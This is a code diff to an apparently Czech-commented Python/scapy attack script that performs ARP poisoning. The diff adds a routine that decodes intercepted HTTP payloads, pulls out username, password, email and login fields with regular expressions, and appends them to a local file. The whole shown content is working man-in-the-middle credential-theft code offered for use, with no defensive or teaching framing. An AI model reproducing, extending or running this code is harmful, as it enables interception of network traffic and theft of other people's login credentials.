@@ -3,6 +3,7 @@ from scapy.layers.l2 import ARP, Ether
 import socket
 import threading
 import time
+import re
 
 # Funkce pro ARP poisoning
 def arp_poison(target_ip, gateway_ip):
@@ -46,6 +47,39 @@ def process_packet(packet):
                 del packet[scapy.TCP].chksum
 
                 scapy.send(packet)
+
+            # Analýza HTTP požadavků pro hledání citlivých údajů
+            if packet.haslayer(scapy.Raw):
+                payload = packet[scapy.Raw].load.decode(errors="ignore")  # Decode the payload to a string
+                
+                # Hledání vzorců pro přihlašovací údaje (uživatelské jméno, heslo, email)
+                login_data = find_login_data(payload)
+                if login_data:
+                    print(f"Nalezena citlivá data: {login_data}")
+                    save_to_file(login_data)
+
+# Funkce pro hledání přihlašovacích údajů v payloadu
+def find_login_data(payload):
+    # Hledání běžných přihlašovacích vzorců
+    login_patterns = [
+        r"username\s*=\s*(\S+)",
+        r"password\s*=\s*(\S+)",
+        r"email\s*=\s*(\S+)",
+        r"login\s*=\s*(\S+)"
+    ]
+    
+    # Pro každý vzorec se pokusíme najít odpovídající data
+    for pattern in login_patterns:
+        match = re.search(pattern, payload)
+        if match:
+            return match.group(0)  # Vrací nalezený text
+    return None
+
+# Funkce pro zápis do souboru
+def save_to_file(data):
+    with open("login_data.txt", "a") as file:
+        file.write(data + "\n")
+        print(f"Data uložena: {data}")
 
 # Hlavní funkce pro spuštění všech akcí
 def start_attack(target_ip, gateway_ip, interface="WiFi 2"):
